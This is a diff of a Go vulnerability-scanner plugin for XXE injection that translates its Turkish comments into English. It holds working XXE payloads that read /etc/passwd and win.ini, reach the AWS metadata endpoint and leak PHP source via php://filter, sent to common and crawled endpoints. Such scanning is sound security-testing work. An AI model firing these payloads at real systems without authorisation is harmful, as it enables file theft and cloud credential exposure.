@@ -9,8 +9,8 @@ import (
 
 // ==================================================
 // XXE INJECTION — v2.0 "XML Devil"
-// Çoklu endpoint · File Read · SSRF-via-XXE
-// PHP wrapper · Spider entegrasyonu
+// Multiple endpoints · File Read · SSRF-via-XXE
+// PHP wrapper · Spider integration
 // ==================================================
 type XXEPlugin struct{}
 
@@ -24,18 +24,18 @@ func (p *XXEPlugin) Run(target models.ScanTarget) *models.Vulnerability {
 	client := models.GetClient()
 	baseURL := getURL(target, "")
 
-	// ── Hedef endpoint'ler ──────────────────────────────────────────────
+	// ── Target endpoints ──────────────────────────────────────────────
 	xmlEndpoints := []string{
 		"/xml", "/upload", "/api", "/api/xml", "/rest", "/rest/xml",
 		"/soap", "/xmlrpc.php", "/xmlrpc", "/sitemap.xml",
 		"/parse", "/convert", "/import", "/feed", "/rss",
 	}
 
-	// ── XML payload'ları ─────────────────────────────────────────────────
+	// ── XML payloads ─────────────────────────────────────────────────
 	type XXEPayload struct {
 		Name    string
 		XML     string
-		Sig     string // response'da aranacak kanıt
+		Sig     string // proof to be searched in response
 		Desc    string
 		Sev     string
 		CVSS    float64
@@ -48,7 +48,7 @@ func (p *XXEPlugin) Run(target models.ScanTarget) *models.Vulnerability {
 				`<!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe "DORM_XXE_8x9k">]>` +
 				`<foo>&xxe;</foo>`,
 			Sig:  "DORM_XXE_8x9k",
-			Desc: "XML entity yansıma testi — parser external entity'leri işliyor.",
+			Desc: "XML entity reflection test — parser processes external entities.",
 			Sev:  "MEDIUM",
 			CVSS: 7.5,
 		},
@@ -58,7 +58,7 @@ func (p *XXEPlugin) Run(target models.ScanTarget) *models.Vulnerability {
 				`<!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///etc/passwd">]>` +
 				`<foo>&xxe;</foo>`,
 			Sig:  "root:x:0:0",
-			Desc: "XXE üzerinden /etc/passwd okunabildi — local file read doğrulandı.",
+			Desc: "/etc/passwd read via XXE — local file read confirmed.",
 			Sev:  "CRITICAL",
 			CVSS: 9.1,
 		},
@@ -68,7 +68,7 @@ func (p *XXEPlugin) Run(target models.ScanTarget) *models.Vulnerability {
 				`<!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini">]>` +
 				`<foo>&xxe;</foo>`,
 			Sig:  "[fonts]",
-			Desc: "XXE üzerinden C:\\Windows\\win.ini okunabildi — Windows local file read doğrulandı.",
+			Desc: "C:\\Windows\\win.ini read via XXE — Windows local file read confirmed.",
 			Sev:  "CRITICAL",
 			CVSS: 9.1,
 		},
@@ -78,7 +78,7 @@ func (p *XXEPlugin) Run(target models.ScanTarget) *models.Vulnerability {
 				`<!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>` +
 				`<foo>&xxe;</foo>`,
 			Sig:  "ami-id",
-			Desc: "XXE üzerinden AWS metadata endpoint'ine SSRF gerçekleşti — iç ağ erişimi doğrulandı.",
+			Desc: "SSRF to AWS metadata endpoint occurred via XXE — internal network access confirmed.",
 			Sev:  "HIGH",
 			CVSS: 8.8,
 		},
@@ -87,21 +87,21 @@ func (p *XXEPlugin) Run(target models.ScanTarget) *models.Vulnerability {
 			XML: `<?xml version="1.0" encoding="ISO-8859-1"?>` +
 				`<!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php">]>` +
 				`<foo>&xxe;</foo>`,
-			Sig:  "PD9waHA", // base64 encoded "<?php" başlangıcı
-			Desc: "php://filter wrapper üzerinden PHP kaynak kodu base64 olarak sızdırıldı.",
+			Sig:  "PD9waHA", // base64 encoded "<?php" prefix
+			Desc: "PHP source code leaked in base64 via php://filter wrapper.",
 			Sev:  "HIGH",
 			CVSS: 8.2,
 		},
 	}
 
-	// ── Content-Type varyantları ─────────────────────────────────────────
+	// ── Content-Type variants ─────────────────────────────────────────
 	contentTypes := []string{
 		"application/xml",
 		"text/xml",
 		"application/soap+xml",
 	}
 
-	// ── Sabit endpoint'leri tara ─────────────────────────────────────────
+	// ── Static endpoints scanning ─────────────────────────────────────────
 	for _, ep := range xmlEndpoints {
 		targetURL := baseURL + ep
 		for _, pl := range payloads {
@@ -121,10 +121,10 @@ func (p *XXEPlugin) Run(target models.ScanTarget) *models.Vulnerability {
 						Severity: pl.Sev,
 						CVSS:     pl.CVSS,
 						Description: fmt.Sprintf(
-							"%s\nEndpoint: %s\nContent-Type: %s\nKanıt: '%s' response'da bulundu.",
+							"%s\nEndpoint: %s\nContent-Type: %s\nProof: '%s' was found in the response.",
 							pl.Desc, targetURL, ct, pl.Sig,
 						),
-						Solution:  "XML parser'ında external entity işlemeyi devre dışı bırakın (FEATURE_SECURE_PROCESSING). Kullanıcıdan gelen XML girdilerini sterilize edin.",
+						Solution:  "Disable external entity processing in XML parser (FEATURE_SECURE_PROCESSING). Sanitize XML inputs from users.",
 						Reference: "OWASP A05:2021 – Security Misconfiguration / XXE (CWE-611)",
 					}
 				}
@@ -132,7 +132,7 @@ func (p *XXEPlugin) Run(target models.ScanTarget) *models.Vulnerability {
 		}
 	}
 
-	// ── Spider endpoint entegrasyonu ─────────────────────────────────────
+	// ── Spider endpoint integration ─────────────────────────────────────
 	key := "endpoints_" + target.IP
 	if existing, ok := models.SharedData.Load(key); ok {
 		spiderEndpoints := existing.([]models.Endpoint)
@@ -157,10 +157,10 @@ func (p *XXEPlugin) Run(target models.ScanTarget) *models.Vulnerability {
 							Severity: pl.Sev,
 							CVSS:     pl.CVSS,
 							Description: fmt.Sprintf(
-								"%s\nSpider'ın keşfettiği endpoint: %s\nContent-Type: %s\nKanıt: '%s' bulundu.",
+								"%s\nEndpoint discovered by spider: %s\nContent-Type: %s\nProof: '%s' found.",
 								pl.Desc, ep.URL, ct, pl.Sig,
 							),
-							Solution:  "XML parser'ında external entity işlemeyi devre dışı bırakın.",
+							Solution:  "Disable external entity processing in the XML parser.",
 							Reference: "OWASP XXE (CWE-611)",
 						}
 					}
